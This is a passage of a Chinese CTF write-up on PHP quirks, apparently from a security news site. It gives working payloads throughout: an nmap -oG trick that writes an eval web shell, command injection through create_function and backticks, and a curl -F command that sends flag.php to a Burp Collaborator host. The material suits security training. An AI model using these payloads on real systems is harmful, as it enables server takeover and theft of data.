+<p>代码中是先使用了<strong>escapeshellarg</strong>函数，再使用<strong>escapeshellcmd</strong>函数便会引发上面的问题,再来仔细观察一下代码，发现<code>mkdir\chadir</code>函数，创建目录和改变当前的目录，应该是要我们写文件进去的，<code>system()</code>函数又是一串namp命令后面拼接上GET传入的参数，因为参数经过了上面的参数处理，<code>；</code>等都会被转义，所以就要从拼接的namp命令想办法了，查了百度谷歌没查到，看了WP才知道</p>
+<blockquote><p>nmap命令中 参数<code>-oG</code>可以实现将命令和结果写到文件（也就是可以写木马）</p></blockquote>
+<p>接下来就写payload，<code>escapeshellarg</code>函数会先对host变量中的单引号进行转义，并且转义之后，在 <code>\'</code> 的左右两边再加上单引号，变成 <code>'\''</code></p>
+<p>然后<code>escapeshellcmd</code>函数，会对host变量中的特殊字符进行转义</p>
+<blockquote><p>（&amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A//和\xFF以及不配对的单/双引号转义）</p></blockquote>
+<p>那么上面的 <code>\</code> 就会被再次转义，比如变成 <code>'\\''</code><br>
+如果在字符串首尾加上单引号，经过<code>escapeshellarg</code>函数之后，就可以实现将单引号给闭合了，在经过<code>escapeshellcmd</code>函数的时候单引号就是配对的，就不会进行转义</p>
+<p>如：</p>
+<pre><code class="lang-cpp hljs language-cpp"><span class="hljs-string">' lemon shy '</span>
+escapeshellarg：<span class="hljs-string">''\'</span><span class="hljs-string">' lemon shy '</span><span class="hljs-string">'\''</span>
+escapeshellcmd: <span class="hljs-string">''\\'</span><span class="hljs-string">' lemon shy '</span><span class="hljs-string">'\\'</span>'
+</code></pre>
+<p>这样就很好理解了，那就会可以实现单引号的逃逸了，接下来就来测试payload：</p>
+<p><img class="alignnone size-full wp-image-234372 aligncenter" alt="" width="1399" height="173" data-original="https://p5.ssl.qhimg.com/t01de4a45d0e3d871ec.png"></p>
+<pre><code class="lang-cpp hljs language-cpp"><span class="hljs-string">' &lt;?php phpinfo();?&gt; -oG 1.php'</span>
+如果最后的单引号是没有空格，则文件名后面就会多出\\，所以后面要加上空格
+前面加空格不加则无影响，因为不会影响到一句话木马里面的内容
+</code></pre>
+<p>但还有一个问题，escapeshellcmd会把一句话木马中的一些字符给转义的，又该怎么办，测试一下在本地传一下发现虽然看起来转义了，但写入的话还是没有被转义的。</p>
+<p><img class="alignnone size-full wp-image-234373 aligncenter" alt="" width="868" height="266" data-original="https://p0.ssl.qhimg.com/t01ec3efacb2dfdd0ee.png"></p>
+<p>所以最终的payload:</p>
+<pre><code class="lang-cpp hljs language-cpp"><span class="hljs-string">' &lt;?php @eval($_POST["a"]);?&gt; -oG 1.php '</span>
+或
+<span class="hljs-string">'&lt;?php @eval($_POST["a"]);?&gt; -oG 1.php '</span>
+</code></pre>
+<p><img class="alignnone size-full wp-image-234374 aligncenter" alt="" width="884" height="123" data-original="https://p1.ssl.qhimg.com/t01ede0e7714aa5f455.png"></p>
+<p>创建的目录也出来了，写的一句话木马文件在该目录下，连接一下，得到flag</p>
+<p><img class="alignnone size-full wp-image-234375 aligncenter" alt="" width="489" height="161" data-original="https://p1.ssl.qhimg.com/t0157fb4fc1d0a870a9.png"></p>
+<p>也可以传一个GET进去，调用system函数</p>
+<pre><code class="lang-cpp hljs language-cpp"><span class="hljs-string">' &lt;?php @eval($_GET["a"]);?&gt; -oG 2.php '</span>
+
+http:<span class="hljs-comment">//e5b384ba-6852-4e3f-9060-c66dc267e554.node3.buuoj.cn/8f9395193b358d86a100d2fd1f0349a2/2.php?a=system('cat /flag');</span>
+</code></pre>
+<p><img class="alignnone size-full wp-image-234376 aligncenter" alt="" width="1401" height="232" data-original="https://p0.ssl.qhimg.com/t016faa37645e2d421a.png"></p>
+<p>&nbsp;</p>
+<h2 name="h2-11" id="h2-11">0x11：PHP精度绕过缺陷</h2>
+<p>几次都碰到这个点，记录一下，省的以后忘了再去查</p>
+<p><strong>浮点运算的坑</strong></p>
+<p>在用PHP进行浮点数的运算中,经常会出现一些和预期结果不一样的值，先来看个小例子</p>
+<p><img class="alignnone size-full wp-image-234377 aligncenter" alt="" width="1095" height="152" data-original="https://p1.ssl.qhimg.com/t01c852e37ce4ea7c31.png"></p>
+<p>输出的是57，而我们预想的应该是58</p>
+<p>具体详细的原理可以看这位师傅的描述<br><a href="http://www.haodaquan.com/12">http://www.haodaquan.com/12</a></p>
+<p>简单的说因为PHP 通常使用 IEEE 754 双精度格式而且由于浮点数的精度有限的原因。除此之外取整而导致的最大相对误差为 <code>1.11e-16</code>,当小数小于<code>10^-16</code>后，PHP对于小数就大小不分了，如下图：</p>
+<p><img class="alignnone size-full wp-image-234378 aligncenter" alt="" width="1241" height="154" data-original="https://p1.ssl.qhimg.com/t01f061707d326ceca6.png"></p>
+<p>再来看一道ciscn2020初赛的题，便考察了这一点：</p>
+<p><strong>easytrick</strong></p>
+<pre><code class="lang-bash hljs language-bash"> &lt;?php
+class trick{
+    public <span class="hljs-variable">$trick1</span>;
+    public <span class="hljs-variable">$trick2</span>;
+    public <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">__destruct</span></span>(){
+        <span class="hljs-variable">$this</span>-&gt;trick1 = (string)<span class="hljs-variable">$this</span>-&gt;trick1;
+        <span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$this</span>-&gt;trick1) &gt; 5 || strlen(<span class="hljs-variable">$this</span>-&gt;trick2) &gt; 5){
+            die(<span class="hljs-string">"你太长了"</span>);
+        }
+        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$this</span>-&gt;trick1 !== <span class="hljs-variable">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="hljs-variable">$this</span>-&gt;trick1) === md5(<span class="hljs-variable">$this</span>-&gt;trick2) &amp;&amp; <span class="hljs-variable">$this</span>-&gt;trick1 != <span class="hljs-variable">$this</span>-&gt;trick2){
+            <span class="hljs-built_in">echo</span> file_get_contents(<span class="hljs-string">"/flag"</span>);
+        }
+    }
+}
+highlight_file(__FILE__);
+unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'trick'</span>]);
+</code></pre>
+<p>看了Drom师傅的博客学到了这种方法：</p>
+<p>因为这道题是考察<strong>浮点数精度问题导致的大小比较以及函数处理问题</strong>，当小数小于<code>10^-16</code>后，PHP对于小数就大小不分了</p>
+<pre><code class="lang-bash hljs language-bash">var_dump(1.000000000000000 == 1) &gt;&gt; TRUE
+var_dump(1.0000000000000001 == 1) &gt;&gt; TRUE
+</code></pre>
+<p><img class="alignnone size-full wp-image-234379 aligncenter" alt="" width="1196" height="142" data-original="https://p4.ssl.qhimg.com/t01886e21d4e23fc47f.png"></p>
+<p><code>0.9999999999999999</code>（<strong>17个9</strong>）经过<code>strlen</code>函数会判断为1<br><img alt="" data-original="https://cdn.nlark.com/yuque/0/2021/png/5370867/1613574465561-9932ecbc-6c62-45b1-8b12-0d1970c90f5e.png#align=left&amp;display=inline&amp;height=88&amp;margin=%5Bobject%20Object%5D&amp;originHeight=88&amp;originWidth=1080&amp;size=0&amp;status=done&amp;style=none&amp;width=1080"><br>
+经过测试发现<code>!==</code>和<code>!=</code>均成立</p>
+<p><img class="alignnone size-full wp-image-234380 aligncenter" alt="" width="1127" height="290" data-original="https://p3.ssl.qhimg.com/t0134060560b1c06e18.png"></p>
+<p>最后看一下md5函数处理后是否相同</p>
+<p><img class="alignnone size-full wp-image-234381 aligncenter" alt="" width="1010" height="183" data-original="https://p1.ssl.qhimg.com/t01345c49249940537e.png"></p>
+<p>确实也成立，那就写payload即可</p>
+<pre><code class="lang-bash hljs language-bash">&lt;?php
+class trick{
+    public <span class="hljs-variable">$trick1</span> ;
+    public <span class="hljs-variable">$trick2</span> ;
+}
+
+<span class="hljs-variable">$shy</span> = new trick();
+<span class="hljs-variable">$shy</span>-&gt;trick1 = 1;
+<span class="hljs-variable">$shy</span>-&gt;trick2 = 0.9999999999999999;
+<span class="hljs-built_in">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>));
+</code></pre>
+<p>注意这里trick1的值必须为1，如果为0.9999999999999999则出不来结果，因为<code>$this-&gt;trick1 = (string)$this-&gt;trick1;</code>有这个语句的限制，如果为0.9999999999999999，则浮点数就变成了字符类型，因此就不会产生上面的浮点数精度问题</p>
+<p>&nbsp;</p>
+<h2 name="h2-12" id="h2-12">0x12:PHP中类的运用</h2>
+<h4 id="h4--reflectionclass">
+<a class="reference-link" name="%E5%8F%8D%E5%B0%84%E7%B1%BBReflectionClass"></a>反射类ReflectionClass</h4>
+<p>可以看官方的例子了解一下<br>
+这里举个例子，方便理解反射类ReflectionClass</p>
+<pre><code class="lang-groovy">class fuc { //定义一个类
+
+ static
+
+ function ec() {
+
+  echo '我是一个类';
+
+ }
+
+}
+
+$class=new ReflectionClass('fuc'); //建立 fuc这个类的反射类
+
+$fuc=$class-&gt;newInstance(); //相当于实例化 fuc 类
+
+$fuc-&gt;ec(); //执行 fuc 里的方法ec
+
+/*最后输出:我是一个类*/
+#还有其他用法
+$ec=$class-&gt;getmethod('ec'); //获取fuc 类中的ec方法
+
+$fuc=$class-&gt;newInstance(); //实例化
+
+$ec-&gt;invoke($fuc);   //执行ec 方法
+</code></pre>
+<p>例如这道题：</p>
+<p><img class="alignnone size-full wp-image-234382 aligncenter" alt="" width="1141" height="505" data-original="https://p2.ssl.qhimg.com/t0151feca63c02bf079.png"></p>
+<p>payload：</p>
+<pre><code class="lang-groovy">?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;
+</code></pre>
+<h4 id="h4--exception">
+<a class="reference-link" name="%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E7%B1%BBException"></a>异常处理类Exception</h4>
+<p>先简单了解一下PHP异常处理</p>
+<p><img class="alignnone size-full wp-image-234383 aligncenter" alt="" width="932" height="300" data-original="https://p0.ssl.qhimg.com/t0108d654cf02dc0d1f.png"></p>
+<p>这里举个例子，方便理解异常类</p>
+<pre><code class="lang-groovy">&lt;?php
+// 创建一个有异常处理的函数
+function checkNum($number)
+{
+    if($number&gt;1)
+    {
+        throw new Exception("变量值必须小于等于 1");
+    }
+        return true;
+}
+
+// 在 try 块 触发异常
+try
+{
+    checkNum(2);
+    // 如果抛出异常，以下文本不会输出
+    echo '如果输出该内容，说明 $number 变量';
+}
+// 捕获异常
+catch(Exception $e)
+{
+    echo 'Message: ' .$e-&gt;getMessage();
+}
+?&gt;
+上面代码将得到类似这样一个错误：Message: 变量值必须小于等于 1
+</code></pre>
+<p>例如这道题：</p>
+<p><img class="alignnone size-full wp-image-234384 aligncenter" alt="" width="816" height="323" data-original="https://p4.ssl.qhimg.com/t01ab86a4d47aeea68f.png"></p>
+<pre><code class="lang-groovy">?v1=Exception&amp;v2=system('ls')
+</code></pre>
+<p>虽然源代码中含有了括号，但是我们还是可以自己加上去，以及在里面设置参数，后面多出的（）不对结果造成影响</p>
+<h4 id="h4--filesystemiterator">
+<a class="reference-link" name="%E5%86%85%E7%BD%AE%E7%B1%BBFilesystemIterator"></a>内置类FilesystemIterator</h4>
+<p>先简单了解一下这个类的作用</p>
+<blockquote><p>PHP使用FilesystemIterator迭代器遍历目录</p></blockquote>
+<p><img class="alignnone size-full wp-image-234385 aligncenter" alt="" width="1587" height="475" data-original="https://p2.ssl.qhimg.com/t01eb9e7e69f2adb436.png"></p>
+<p>例如这道题：</p>
+<p><img class="alignnone size-full wp-image-234386 aligncenter" alt="" width="1270" height="458" data-original="https://p4.ssl.qhimg.com/t01902243be95cc16c8.png"></p>
+<p>只需获取当前路径，便可以将当前目录下所有文件给显示出来，这里可以使用php中的getcwd这个函数</p>
+<blockquote><p>getchwd() 函数返回当前工作目录</p></blockquote>
+<p>故payload为</p>
+<pre><code class="lang-groovy">?v1=FilesystemIterator&amp;v2=getcwd
+</code></pre>
+<p>&nbsp;</p>
+<h2 name="h2-13" id="h2-13">0x13：一些姿势汇总</h2>
+<h4 id="h4--proc-self-root-is_file-">
+<a class="reference-link" name="/proc/self/root%E7%BB%95%E8%BF%87is_file%E5%87%BD%E6%95%B0"></a>/proc/self/root绕过is_file函数</h4>
+<p><img class="alignnone size-full wp-image-234387 aligncenter" alt="" width="851" height="277" data-original="https://p1.ssl.qhimg.com/t01750421cd2942e9a4.png"></p>
+<p>payload:</p>
+<pre><code class="lang-groovy">?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p
+roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro
+c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/
+self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se
+lf/root/proc/self/root/var/www/html/flag.php
+</code></pre>
+<p><img class="alignnone size-full wp-image-234388 aligncenter" alt="" width="896" height="97" data-original="https://p5.ssl.qhimg.com/t01a4b60ec83f6ca91b.png"></p>
+<p>在linux中/proc/self/root是指向根目录的,这里看了很多师傅的wp，都是只记录了一个payload，找到了一个大师傅对于这个方法的解释</p>
+<h4 id="h4-gettext-amp-get_defined_vars-">
+<a class="reference-link" name="gettext&amp;get_defined_vars%E5%87%BD%E6%95%B0"></a>gettext&amp;get_defined_vars函数</h4>
+<p><img class="alignnone size-full wp-image-234389 aligncenter" alt="" width="809" height="350" data-original="https://p1.ssl.qhimg.com/t01b9f4be8fb108cede.png"></p>
+<p>这道题涉及到的是php中的gettext的用法，先了解一下</p>
+<blockquote><p>php的扩展gettext实现程序的国际化</p></blockquote>
+<p><img class="alignnone size-full wp-image-234390 aligncenter" alt="" width="1243" height="292" data-original="https://p5.ssl.qhimg.com/t01ca687893405944b8.png"></p>
+<p><code>_()是gettext()</code>函数的简写形式，那既然变量f1过滤数字和字母，就可以使用该符号来代替这个函数，这样便可以绕过第一个嵌套，然后再由最外面的call_user_func执行命令</p>
+<pre><code class="lang-groovy">call_user_func(call_user_func('_','phpinfo'))=&gt;call_user_func('phpinfo')
+</code></pre>
+<p>虽然该函数会报错</p>
+<p><img class="alignnone size-full wp-image-234391 aligncenter" alt="" width="1123" height="55" data-original="https://p0.ssl.qhimg.com/t01ee7c186408538bf1.png"></p>
+<p>但是还是会继续执行，不会停止,这时候便会执行phpinfo这个命令，但这里要获取flag,就需要再了解一个函数<code>get_defined_vars</code></p>
+<p><img class="alignnone size-full wp-image-234392 aligncenter" alt="" width="1290" height="404" data-original="https://p5.ssl.qhimg.com/t0177ede25a046de4d7.png"></p>
+<p>已知包含了flag.php。而flag.php肯定包含已定义好的变量列表的多维数组，故payload：</p>
+<pre><code class="lang-groovy">?f1=_&amp;f2=get_defined_vars
+</code></pre>
+<p><img class="alignnone size-full wp-image-234393 aligncenter" alt="" width="1868" height="257" data-original="https://p5.ssl.qhimg.com/t01a6e52262a089ccba.png"></p>
+<h4 id="h4-linux-tee-">
+<a class="reference-link" name="Linux%20tee%E5%91%BD%E4%BB%A4"></a>Linux tee命令</h4>
+<p><code>tee</code>命令主要被用来向standout(标准输出流，通常是命令执行窗口）输出的同时也将内容输出到文件</p>
+<pre><code class="lang-groovy">tee file1 file2 //复制文件
+ls|tee Sn0w.txt //命令输出
+</code></pre>
+<p>例如这道题：</p>
+<p><img class="alignnone size-full wp-image-234394 aligncenter" alt="" width="1390" height="311" data-original="https://p2.ssl.qhimg.com/t01aa12f1a8fa1ebe39.png"></p>
+<pre><code class="lang-groovy">?c=ls /|tee Sn0w
+在url后面请求Sn0w文件
+</code></pre>
+<p><img class="alignnone size-full wp-image-234395 aligncenter" alt="" width="450" height="446" data-original="https://p3.ssl.qhimg.com/t01df0a06f8c1bc53d1.png"></p>
+<h4 id="h4-burp-collaborator-client">
+<a class="reference-link" name="Burp%20Collaborator%20Client"></a>Burp Collaborator Client</h4>
+<p><img class="alignnone size-full wp-image-234396 aligncenter" alt="" width="765" height="383" data-original="https://p1.ssl.qhimg.com/t01553f2c34b7a2463d.png"></p>
+<p>这道题主要考察的是命令执行的骚操作和curl -F的使用</p>
+<p>如果传递的参数是$F本身，会不会出现变量覆盖那</p>
+<pre><code class="lang-groovy">?F=`$F `;sleep 3
+substr函数截取前六位得到的是`$F `;
+然后$F便是输出的`$F `;sleep 3，故最后执行的代码是
+``$F `;sleep 3`
+``是shell_exec()函数的缩写
+</code></pre>
+<p>发现curl并没有被过滤，便可以利用curl带出flag.php，curl -F 将flag文件上传到Burp的 Collaborator Client( Collaborator Client 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看 POST请求包以及打Cookies)</p>
+<p><img class="alignnone size-full wp-image-234397 aligncenter" alt="" width="499" height="379" data-original="https://p3.ssl.qhimg.com/t01c5a4090a9387677c.png"></p>
+<p><img class="alignnone size-full wp-image-234398 aligncenter" alt="" width="864" height="760" data-original="https://p3.ssl.qhimg.com/t01df8c04e4ca7e9f33.png"></p>
+<p>payload：</p>
+<pre><code class="lang-groovy">?F=`$F `;curl -X POST -F Sn0w=@flag.php  1216a307cv2bgog6aua6lmje157vvk.burpcollaborator.net
+</code></pre>
+<p>这里要解释一下</p>
+<pre><code class="lang-groovy">#其中-F 为带文件的形式发送post请求
+#Sn0w是上传文件的name值，flag.php就是上传的文件
+</code></pre>
+<p>其实原理很简单，相当于这台服务器上传文件传输到burp的Collaborator Client</p>
+<h4 id="h4-call_user_func-">
+<a class="reference-link" name="call_user_func%E8%AF%BB%E5%8F%96%E7%B1%BB%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0"></a>call_user_func读取类中的函数</h4>
+<p>call_user_func函数可以调用类中的函数，这里举一个简单的例子</p>
+<pre><code class="lang-groovy">class Test
+{    
+    static public function getS()
+    {
+        echo "123";
+    }
+}
+相当于
+call_user_func(array('Test','getS'));
+#输出结果
+123
+定义一个类Test及类方法getS,call_user_func的输入参数变为一个数组，数组第一个元素为对象名、第二个元素为参数
+#如果不加static，数据会出现，但是有可能会报错
+</code></pre>
+<p>例如：</p>
+<p><img class="alignnone size-full wp-image-234399 aligncenter" alt="" width="652" height="489" data-original="https://p4.ssl.qhimg.com/t01f37a3b1225727772.png"></p>
+<p>payload：</p>
+<pre><code class="lang-groovy">ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag
+</code></pre>
+<h4 id="h4-create_function-">
+<a class="reference-link" name="create_function%E5%87%BD%E6%95%B0"></a>create_function函数</h4>
+<p>create_function，第一个参数是参数，第二个参数是内容，函数结构类似：</p>
+<pre><code class="lang-php hljs language-php">create_function(<span class="hljs-string">'$a,$b'</span>,<span class="hljs-string">'return 111'</span>)
+相当于如下：
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>{
+    <span class="hljs-keyword">return</span> <span class="hljs-number">111</span>;
+}
+</code></pre>
+<p>所以那如果我们这样进行构造payload</p>
+<pre><code class="lang-php hljs language-php">create_function(<span class="hljs-string">'$a,$b'</span>,<span class="hljs-string">'return 111;}phpinfo();//'</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>{
+    <span class="hljs-keyword">return</span> <span class="hljs-number">111</span>;}phpinfo();<span class="hljs-comment">//</span>
+}
+</code></pre>
+<p>phpinfo()便会被执行，所以根据这个思路来进行构造payload</p>
+<pre><code class="lang-php hljs language-php">?show=<span class="hljs-keyword">echo</span> Sn0w;}system(<span class="hljs-string">'cat f*'</span>);<span class="hljs-comment">//</span>
+DATA:
+ctf=%<span class="hljs-number">5</span>ccreate_function</code><code class="hljs language-undefined">
+</code></pre>
+
+</div><div class="_53" style="display: none;"> 本文翻译自 <a href="https://www.anquanke.com/post/id/231507" target="_blank">原文链接</a>。如若转载请注明出处。 </div><div class="_206" style="display: none;"> 商务合作，文章发布请联系 anquanke@360.cn </div><div class="_59"><p> 本文由<b>Sn0w</b>原创发布 </p><p> 转载，请参考<a href="https://www.anquanke.com/note/repost" target="_blank">转载声明</a>，注明出处： <a href="https://www.anquanke.com/post/id/231507" target="_blank">https://www.anquanke.com/post/id/231507</a></p><p>安全客 - 有思想的安全新媒体</p></div><div class="_62" style="display: none;"><p> 本文转载自: <a href="https://www.anquanke.com/post/id/231507"></a></p><p> 如若转载,请注明出处： <a href="https://www.anquanke.com/post/id/231507" target="_blank"></a></p><p>安全客 - 有思想的安全新媒体</p></div><div class="_63 share1"><div class="main-w"><div class="bg"></div><div class="main"><span>分享到：</span><img class="icon" data-cmd="weixin" alt="微信" src="./CTF_PHP特性汇总-安全客 - 安全资讯平台_files/t01e29062a5dcd13c10.png"></div></div><div class="qrcode" title="https://anquanke.com/post/id/231507" style="display: none;"><canvas width="90" height="90" style="display: none;"></canvas><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFoAAABaCAYAAAA4qEECAAAAAXNSR0IArs4c6QAABK5JREFUeF7tnOt6nDAMRNn3f+jtt2RpwSBxxjJ0k0x/psY2x9LogpPHNE3PafC/5/PflI/HI5x9PU7dQjavOhfdrzrvevyLgkFDwzDoCoGXpd0NepQrV+bJmEVyEa23Ht+Oif4ve0Y5z3avG+moABq1QYM+OU6D3gLCFk2ieqRt5OftuZH1orMm0tE+S55RtTsbH0oHeXEClFo6Wc+gp2mqBheDTrRZtejMfanln0V+Oo9qGMQQPkY6DPpNYJT403mIR5xZcBZUs3T1V1k0CW5UCpa5iIu/xv7orINaZ8XSDZpSTnoPpHL9dqAFLvNQ4uIthIr7Vp69OyjPfNZtUmIx0QEYdGcJbouOAyZhk/Y6yARkDA1mlRSLrFFtk5J3pWNu/cJS7QmPOpgsptBgSgH/TTvv/JT1q0E/KxFQPNYs6yDWKi6XDr/xtb+yMoMeeXzxXAZ9D+dtHk3WrBQKPe4aBSeyj/X79DSY1s+TIInbpAbNmk0RJ4NOunW97YMj2GXQPS5/tBHa6yCepY6hGQ+Zl/DoqgzJxGSDBn1CyaC3gAgPW/SbGf3cdqbFkY3uQEcFC0mr1DHEEjLn6mnFLvNV16ZAo/XCgkWFGOWsBA7R92p2YNCUcudXnI+0aNLYIZZBvKHlSyqviteo87f7I++dVZIb6TDo2L0MuigpVLmGgiZNFJIW0YYP+RylRvuR4IiHR3K2k8ar07vs8Ay6cUcShMjJ0n4DcdM7gtstFq267Eg4xNLV/Jz2WarzhtzUT1k9qduyOLVCg4aSonpDlrMS9+3xJhKwe+YN351cCSMvGy3Q8wmJrEdA0QyExKDqeujuHXlxg86P1aAbPiQ+kHpjl0dHN5VIYdKT0hHLJwGXjOkBMkpGWqkJ794ZdPzL+ESvDVqIkBUZwaArskBOPHtfklZFsqB6YpZaEumhh4Gu7arg1PH0ZUl+btBJsfMrQKslOJE4WmqTCK+OIZL3GkN6GiPrh0tukxr0/g6fQd/wW7SzB0W9jlFuk7kosXw1sOIsIPkzcYv8kOyHSJBBnwQcg4bt2qu8ieTwu15HJetQ5YVYCM0ISE5NMiRaOJF3TVvCBh2jJnqPNdqgDXomQOVmwUUyGSopl1k0dYOjjZL+cBUCgV5dgx7C0Tis0QZdwZx7H7rkSJa3RQugCVB1DHVltb2pysiuEb+qDNW5VAZzylrJOsiCBv1FyaBhZkMNJiykrv57HVG5SryhHaM2mOgaahq3npc8O1u0QbOv3Wqw7/o4Sy1jGXeH5V3lKaSnUbZoEn1DDQJRPNM5dW1iYZmBqDUDWS/tFpJLjsSiycYN+k1StarIfXukQ12bWNi3sGiSztCISxo+ZC6ypwhuVrAQjyW6HI3ZZR2V6mykdKgBiYAy6APZMujGdK5299dyxMtUfW89oHKwNB6h6wZE9yqbzVzfoOEf1K4EMFv0IF1VpYe66ZGH9LRJ1QCfed9/lQ6DhldsVVBZN45o/I+0aJKbksowrf+D+28E6FWZhtqsIsaWFiwGvb1DXcm8DPqkx0Mypi6LVq1YPeVMoysyRLKDrEghfQwiVbhNatDsa0vEyaAPyJA2q+opBv0BoP8Aw+W+5pNjPCAAAAAASUVORK5CYII=" style="display: block;"></div></div><ul class="_65"><li><a target="_blank" href="https://www.anquanke.com/tag/CTF">CTF</a></li></ul><div class="_56"><div class="line line1"><div class="_18 item1"><b style="display: none;">+1</b><i class="iconfont icon-rate"></i><span class="rate-text">29赞</span></div><div class="_12 item1"><i class=""></i><span>收藏</span></div></div><div class="line line2"><div class="user"><img class="avatar" src="./CTF_PHP特性汇总-安全客 - 安全资讯平台_files/t015b53550d07592c19.png"><span class="name">Sn0w</span><span class="label label-verify"></span></div><div class="_63 share2"><div class="main-w"><div class="bg"></div><div class="main"><span>分享到：</span><img class="icon" data-cmd="weixin" alt="微信" src="./CTF_PHP特性汇总-安全客 - 安全资讯平台_files/t01e29062a5dcd13c10.png"></div></div><div class="qrcode" title="https://anquanke.com/post/id/231507" style="display: none;"><canvas width="90" height="90" style="display: none;"></canvas><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFoAAABaCAYAAAA4qEECAAAAAXNSR0IArs4c6QAABK5JREFUeF7tnOt6nDAMRNn3f+jtt2RpwSBxxjJ0k0x/psY2x9LogpPHNE3PafC/5/PflI/HI5x9PU7dQjavOhfdrzrvevyLgkFDwzDoCoGXpd0NepQrV+bJmEVyEa23Ht+Oif4ve0Y5z3avG+moABq1QYM+OU6D3gLCFk2ieqRt5OftuZH1orMm0tE+S55RtTsbH0oHeXEClFo6Wc+gp2mqBheDTrRZtejMfanln0V+Oo9qGMQQPkY6DPpNYJT403mIR5xZcBZUs3T1V1k0CW5UCpa5iIu/xv7orINaZ8XSDZpSTnoPpHL9dqAFLvNQ4uIthIr7Vp69OyjPfNZtUmIx0QEYdGcJbouOAyZhk/Y6yARkDA1mlRSLrFFtk5J3pWNu/cJS7QmPOpgsptBgSgH/TTvv/JT1q0E/KxFQPNYs6yDWKi6XDr/xtb+yMoMeeXzxXAZ9D+dtHk3WrBQKPe4aBSeyj/X79DSY1s+TIInbpAbNmk0RJ4NOunW97YMj2GXQPS5/tBHa6yCepY6hGQ+Zl/DoqgzJxGSDBn1CyaC3gAgPW/SbGf3cdqbFkY3uQEcFC0mr1DHEEjLn6mnFLvNV16ZAo/XCgkWFGOWsBA7R92p2YNCUcudXnI+0aNLYIZZBvKHlSyqviteo87f7I++dVZIb6TDo2L0MuigpVLmGgiZNFJIW0YYP+RylRvuR4IiHR3K2k8ar07vs8Ay6cUcShMjJ0n4DcdM7gtstFq267Eg4xNLV/Jz2WarzhtzUT1k9qduyOLVCg4aSonpDlrMS9+3xJhKwe+YN351cCSMvGy3Q8wmJrEdA0QyExKDqeujuHXlxg86P1aAbPiQ+kHpjl0dHN5VIYdKT0hHLJwGXjOkBMkpGWqkJ794ZdPzL+ESvDVqIkBUZwaArskBOPHtfklZFsqB6YpZaEumhh4Gu7arg1PH0ZUl+btBJsfMrQKslOJE4WmqTCK+OIZL3GkN6GiPrh0tukxr0/g6fQd/wW7SzB0W9jlFuk7kosXw1sOIsIPkzcYv8kOyHSJBBnwQcg4bt2qu8ieTwu15HJetQ5YVYCM0ISE5NMiRaOJF3TVvCBh2jJnqPNdqgDXomQOVmwUUyGSopl1k0dYOjjZL+cBUCgV5dgx7C0Tis0QZdwZx7H7rkSJa3RQugCVB1DHVltb2pysiuEb+qDNW5VAZzylrJOsiCBv1FyaBhZkMNJiykrv57HVG5SryhHaM2mOgaahq3npc8O1u0QbOv3Wqw7/o4Sy1jGXeH5V3lKaSnUbZoEn1DDQJRPNM5dW1iYZmBqDUDWS/tFpJLjsSiycYN+k1StarIfXukQ12bWNi3sGiSztCISxo+ZC6ypwhuVrAQjyW6HI3ZZR2V6mykdKgBiYAy6APZMujGdK5299dyxMtUfW89oHKwNB6h6wZE9yqbzVzfoOEf1K4EMFv0IF1VpYe66ZGH9LRJ1QCfed9/lQ6DhldsVVBZN45o/I+0aJKbksowrf+D+28E6FWZhtqsIsaWFiwGvb1DXcm8DPqkx0Mypi6LVq1YPeVMoysyRLKDrEghfQwiVbhNatDsa0vEyaAPyJA2q+opBv0BoP8Aw+W+5pNjPCAAAAAASUVORK5CYII=" style="display: block;"></div></div></div></div></div><div class="_60"><h2 class="g-title">推荐阅读</h2><ul><li><a href="https://www.anquanke.com/post/id/287522"><img src="./CTF_PHP特性汇总-安全客 - 安全资讯平台_files/t0145bc92f9bdd6aaf8.png"><h5 class="g-line2">Kubernetes攻击频发，如何避免集群“裸奔”</h5><p>2023-03-18 16:30:36</p></a></li><li><a href="https://www.anquanke.com/post/id/287521"><img src="https://www.anquanke.com/post/id/231507"><h5 class="g-line2">身份威胁态势分析</h5><p>2023-03-17 14:30:10</p></a></li><li><a href="https://www.anquanke.com/post/id/287417"><img src="./CTF_PHP特性汇总-安全客 - 安全资讯平台_files/t0129d007ba00bb6766.jpg"><h5 class="g-line2">windows应急响应</h5><p>2023-03-15 15:30:13</p></a></li><li><a href="https://www.anquanke.com/post/id/287394"><img src="./CTF_PHP特性汇总-安全客 - 安全资讯平台_files/t01191796a6bf268121.jpg"><h5 class="g-line2">CVE-2021-26411 漏洞利用样本分析</h5><p>2023-03-15 10:30:49</p></a></li></ul></div><div class="_7 index-comment"><h2 class="g-title">发表评论</h2><div class="login"><p class="login-text">您还未登录，请先登录。</p><p class="login-bar"><a href="https://www.anquanke.com/login/index.html">登录</a></p></div><!----><!----><!----></div></div><div class="index-side"><div class="index-side-top"><div class="_66"><img class="banner" src="./CTF_PHP特性汇总-安全客 - 安全资讯平台_files/t018485aa921b79f341.png"><div class="w"><a class="avatar" href="https://www.anquanke.com/member.html?memberId=141811"><img src="./CTF_PHP特性汇总-安全客 - 安全资讯平台_files/t015b53550d07592c19.png"></a><p class="info"><a href="https://www.anquanke.com/member.html?memberId=141811" class="name">Sn0w</a><a href="https://www.anquanke.com/member.html?memberId=141811" class="user-label 